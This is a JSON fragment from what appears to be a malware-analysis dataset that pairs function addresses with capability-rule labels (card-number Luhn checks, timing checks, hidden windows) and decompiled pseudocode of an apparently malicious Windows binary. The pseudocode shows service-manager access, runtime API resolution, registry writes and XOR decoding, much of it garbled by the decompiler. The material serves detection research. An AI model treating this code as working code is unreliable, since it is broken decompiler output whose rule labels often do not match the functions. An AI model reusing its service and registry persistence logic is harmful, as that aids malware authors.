            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403de0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00403440(uVar1, arg_8h);\n    uVar2 = fcn.00401130(uVar1, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 129
    },
    "00403fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00403fe0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411354);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4236f8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x411364);\n    *0x4236fc = (*pcVar1)(iVar2, 0x411380);\n    *0x423700 = (*pcVar1)(iVar2, 0x411390);\n    if (((*0x4236f8 != 0) && (*0x4236fc != 0)) && (*0x423700 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 201
    },
    "004043a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004043a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00404680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404680(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401000(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "00404790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404790(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    iVar3 = fcn.00403e70(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *(iVar3 + 0x58) = arg_ch;\n    fcn.00403e70(uVar1, uVar2, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 151
    },
    "00404a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a4f) overlaps instruction at (ram,0x00404a4b)\n// \n\nvoid __cdecl fcn.00404a30(uint32_t noname_0, int32_t *noname_1, uint noname_2, uint noname_3, uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    uint32_t unaff_EBX;\n    uchar **unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uchar in_CF;\n    char in_ZF;\n    char in_SF;\n    char in_OF;\n    uchar *puStack4;\n    \n    while( true ) {\n        puStack4 = unaff_EBP;\n        if ((in_CF) || (!in_CF)) goto code_r0x00404a52;\n        in_ECX = in_ECX + -1;\n        if (in_ECX == 0 || in_ZF == '\\0') break;\n        uVar1 = in_EAX;\n        *in_EAX = *in_EAX | uVar1;\n        uVar3 = unaff_EBX;\n        in_CF = CARRY1(uVar3, uVar1);\n        in_OF = SCARRY1(uVar3, uVar1);\n        uVar3 = uVar3 + uVar1;\n        unaff_EBX = unaff_EBX & 0xffffff00 | uVar3;\n        in_SF = uVar3 < '\\0';\n        in_ZF = uVar3 == 0;\n        unaff_EBP = &puStack4;\n    }\n    *unaff_EDI = unaff_ESI + 4;\n    piVar4 = 0x8bb8ec44;\n    noname_1 = unaff_EDI;\n    if (in_OF == in_SF) goto code_r0x00404a5e;\ncode_r0x00404a52:\n    piVar4 = NULL;\n    unaff_EBX = noname_0;\n    if (noname_1 != NULL) {\ncode_r0x00404a5e:\n        do {\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(piVar4 + unaff_EBX) = iVar2 % 0x1a + 'a';\n            piVar4 = piVar4 + 1;\n        } while (piVar4 < noname_1);\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "00404cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cb0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t in_DL;\n    uint8_t unaff_BL;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = false;\n    bVar4 = (in_DL & unaff_BL) == 0;\n    fcn.00404b30(&var_68h, &var_4h);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00403350(&var_68h, var_4h, 0x4116e0, 0x12000);\n    *arg_8h = 0x4116e0;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 339
    },
    "00404de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404e76) overlaps instruction at (ram,0x00404e75)\n// \n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.00404de0(uint *arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t unaff_EBX;\n    int32_t iVar6;\n    uint *unaff_EDI;\n    uint *puVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    bool bVar9;\n    int32_t var_8h;\n    uint var_2h;\n    \n    bVar9 = false;\n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar5 = 1;\n        puVar7 = unaff_EDI;\n        do {\n            if ((!bVar9) && (bVar9)) {\n                *unaff_EDI = arg_8h;\n                return;\n            }\n            unaff_EBX = unaff_EBX & 0xffffff00 | *(var_8h + arg_10h);\n            bVar9 = arg_10h <= puVar7;\n            bVar8 = puVar7 == arg_10h;\n            uVar3 = *(iVar5 % arg_ch + arg_8h);\n            iVar6 = arg_ch;\n            if ((bVar8) || (!bVar8)) {\ncode_r0x00404e58:\n                if ((!bVar8) && (bVar8)) {\n                    uVar2 = in(iVar5 % arg_ch);\n                    *arg_8h = uVar2;\n                    if (&stack0xffffffe8 < 1) {\n    // WARNING: Could not recover jumptable at 0x00404ee0. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.MSVCRT.dll___CxxFrameHandler)();\n                        return;\n                    }\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                unaff_EBX = unaff_EBX & 0xffffff00 | unaff_EBX ^ *((iVar5 + -1) % iVar6 + arg_8h);\n                iVar6 = arg_18h;\n                puVar7 = arg_14h;\n            }\n            else {\n                unaff_EBX = unaff_EBX + 1;\n                puVar7 = arg_8h;\n                if (bVar9 && unaff_EBX != 0) {\n                    in_AF = 9 < (uVar3 & 0xf) | in_AF;\n                    piVar1 = (iVar5 / arg_ch & 0xffff0000U |\n                             CONCAT11((iVar5 / arg_ch >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n                    *piVar1 = *piVar1 - unaff_EBX;\n                    iVar6 = arg_ch + 1;\n                    bVar8 = iVar6 == 0;\n                    goto code_r0x00404e58;\n                }\n            }\n            uVar4 = puVar7 * '\\x02';\n            *(iVar6 + -1 + iVar5) = uVar4 ^ unaff_EBX;\n            *(iVar5 + iVar6) = uVar4 ^ uVar3;\n            var_8h = var_8h + 1;\n            bVar9 = SBORROW4(var_8h, puVar7);\n            iVar5 = iVar5 + 2;\n        } while (var_8h < puVar7);\n    }\n    return;\n}\n",
        "token_count": 861
    },
    "00402250": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022bf) overlaps instruction at (ram,0x004022be)\n// \n// WARNING: Removing unreachable block (ram,0x004022af)\n// WARNING: Removing unreachable block (ram,0x004022c4)\n\nuint __cdecl fcn.00402250(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4112dc, arg_8h);\n    (*pcVar2)(&var_264h, 0x4112f4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x41131c;\n    var_30h = 0x411328;\n    var_2ch = 0x411334;\n    var_28h = 0x411344;\n    var_24h = 0x41134c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1148
    },
    "00404500": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040453f) overlaps instruction at (ram,0x0040453c)\n// \n// WARNING: Removing unreachable block (ram,0x00404533)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00404500(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.004033c0();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00403fe0();\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar1 = fcn.00403d10(0x4112c4);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00401a00();\n    *0x4236f0 = 1;\n    iVar1 = fcn.00404d40();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403bc0(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403500(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403020(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 771
    },
    "004032f0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040333d) overlaps instruction at (ram,0x0040333b)\n// \n\nuint __cdecl fcn.004032f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x40701c, 0x4236e8, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "004011f0": {
        "rules": [
            "contain loop",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040120c) overlaps instruction at (ram,0x0040120a)\n// \n\nint32_t __fastcall fcn.004011f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    char in_SF;\n    char in_OF;\n    uchar *puStack44;\n    \n    puVar2 = &stack0xfffffffc;\n    if ((in_OF == in_SF) && (puVar2 = &stack0xfffffffc,  in_OF != in_SF)) {\n        *(param_1 + -0x749ff7bb) = *(param_1 + -0x749ff7bb) | param_1;\n        *(in_EAX + -0x47) = 0;\n        puVar2 = puStack44;\n    }\n    puStack44 = puVar2;\n    *(puStack44 + 0xc) = *(puStack44 + 0xc);\n    if (*(puStack44 + 0x10) != 0) {\n        *(puStack44 + 0x10) = *(puStack44 + 0x10);\n        do {\n            uVar3 = *(puStack44 + 8) + **(puStack44 + 0xc);\n            *(puStack44 + 8) = uVar3;\n            *(puStack44 + -4) = uVar3 >> 0x10;\n            if (uVar3 >> 0x10 != 0) {\n                *(puStack44 + 8) = (*(puStack44 + -4) & 0xffff) + (*(puStack44 + 8) & 0xffff);\n            }\n            iVar1 = *(puStack44 + 0x10);\n            *(puStack44 + 0xc) = *(puStack44 + 0xc) + 2;\n            *(puStack44 + 0x10) = iVar1 + -1;\n        } while (iVar1 + -1 != 0);\n    }\n    return (*(puStack44 + 8) >> 0x10) + *(puStack44 + 8);\n}\n",
        "token_count": 478
    },
    "00403350": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033a7) overlaps instruction at (ram,0x004033a6)\n// \n\nvoid __cdecl fcn.00403350(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t unaff_EBX;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar4 = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar3 = *(uVar4 + arg_10h) ^ *(uVar4 % arg_ch + arg_8h);\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar3;\n            bVar5 = (POPCOUNT(uVar3) & 1U) == 0;\n            if (bVar5) {\ncode_r0x004033a7:\n                uVar1 = arg_14h;\n                uVar2 = arg_10h;\n            }\n            else {\n                uVar1 = uVar4 / arg_ch;\n                uVar2 = uVar4 % arg_ch;\n                if (!bVar5) goto code_r0x004033a7;\n            }\n            *(unaff_EBX + 0x458b1055) = *(unaff_EBX + 0x458b1055) | 0x14;\n            *(uVar4 + uVar2) = uVar3;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "004041f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040438e) overlaps instruction at (ram,0x0040438a)\n// \n// WARNING: Removing unreachable block (ram,0x00404317)\n// WARNING: Removing unreachable block (ram,0x00404321)\n\nvoid __fastcall fcn.004041f0(uint param_1, uint8_t param_2, uint param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar7;\n    int32_t *piVar8;\n    int32_t unaff_EBX;\n    uchar *puVar9;\n    int32_t unaff_ESI;\n    uchar *unaff_EDI;\n    uint *puVar10;\n    ushort in_SS;\n    bool bVar11;\n    bool bVar12;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var13;\n    ulong uVar14;\n    int32_t in_stack_00000014;\n    uchar *in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uchar *in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    int32_t in_stack_fffffee0;\n    \n    puVar9 = &stack0xfffffffc;\n    if ((SBORROW4(&stack0xfffffffc, 0x10c)) || (!SBORROW4(&stack0xfffffffc, 0x10c))) {\n        in_stack_fffffee0 = in_stack_0000001c + 0x20;\n        in_stack_fffffedc = 0x20;\n        unaff_EBX = in_stack_00000014;\n        unaff_ESI = in_stack_0000001c;\n        in_stack_fffffed4 = in_stack_00000018;\n        in_stack_fffffed8 = param_3;\n    }\n    else {\n        *(unaff_EBX + 0x7d8b084d) = *(unaff_EBX + 0x7d8b084d) & 0x21;\n        unaff_EDI[0x6a502046] = unaff_EDI[0x6a502046] + -0x21;\n        *0x758b5d78 = *0x758b5d78 & param_2;\n        puVar9 = unaff_EDI;\n        in_stack_00000018 = unaff_EDI;\n    }\n    do {\n        fcn.00404de0(unaff_EBX, in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc, in_stack_fffffee0);\n        cVar3 = fcn.00404de0(unaff_EBX, in_stack_00000018, *(puVar9 + 0xc), 0x20, unaff_ESI + 0x60);\n        bVar11 = false;\n        bVar12 = (POPCOUNT((cVar3 + 1) - 1 & 0x7b) & 1U) == 0;\n        in_stack_fffffed8 = *(puVar9 + 0x10);\n        in_stack_fffffee0 = unaff_ESI + 0xa0;\n        in_stack_fffffedc = 0x20;\n        in_stack_fffffed4 = in_stack_00000018;\n        fcn.00404de0(unaff_EBX, in_stack_00000018, in_stack_fffffed8, 0x20, in_stack_fffffee0);\n        if ((bVar12) || (!bVar12)) break;\n        segment(in_SS, *0x10 + -0x130);\n        if (bVar11) goto code_r0x004042c1;\n    } while (bVar12);\n    fcn.00404de0(unaff_EBX, in_stack_00000018, *(puVar9 + 0x14), 0x20, unaff_ESI + 0xe0);\ncode_r0x004042c1:\n    iVar5 = fcn.004041a0();\n    if (iVar5 == -1) {\n        iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(unaff_ESI + 0x120) = iVar5 % 5;\n    }\n    else {\n        *(unaff_ESI + 0x120) = iVar5;\n    }\n    puVar9[-0x10c] = 0;\n    puVar10 = puVar9 + -0x10b;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar9 + -4) = 0x104;\n    *(puVar10 + 2) = 0;\n    uVar14 = fcn.004046e0(0x80000001);\n    puVar7 = extraout_ECX;\n    puVar9 = unaff_EDI;\n    Var13 = extraout_ST0;\n    if (uVar14 != 0) {\n        uVar14 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        iVar5 = uVar14;\n        puVar7 = extraout_ECX_00;\n        puVar9 = unaff_EDI;\n        Var13 = extraout_ST0_00;\n        if ((iVar5 == 0) && ((iVar5 < 0 || (puVar9 = puVar10 + 3,  iVar5 >= 0)))) {\n            *(unaff_ESI + 0x120) = *(unaff_ESI + 0x120) | 0x80;\n            puVar9 = unaff_EDI;\n        }\n    }\n    piVar8 = uVar14 >> 0x20;\n    *(uVar14 + -0x7ce92414) = Var13;\n    uVar6 = uVar14 - 1;\n    uVar4 = uVar6;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n    uVar4 = uVar4 + in_AF * '\\x06';\n    uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | in_AF * (0xf9 < uVar4)) * '`';\n    puVar2 = uVar6 & 0xffffff00 | uVar4;\n    *piVar8 = *piVar8 + -0x717f207c;\n    *puVar7 = *puVar7 & uVar4;\n    uVar1 = *puVar2;\n    *puVar2 = *puVar2 + uVar4;\n    puVar9[0x5e] = (puVar9[0x5e] + -0x5b) - CARRY1(uVar1, uVar4);\n    return;\n}\n",
        "token_count": 1598
    }
}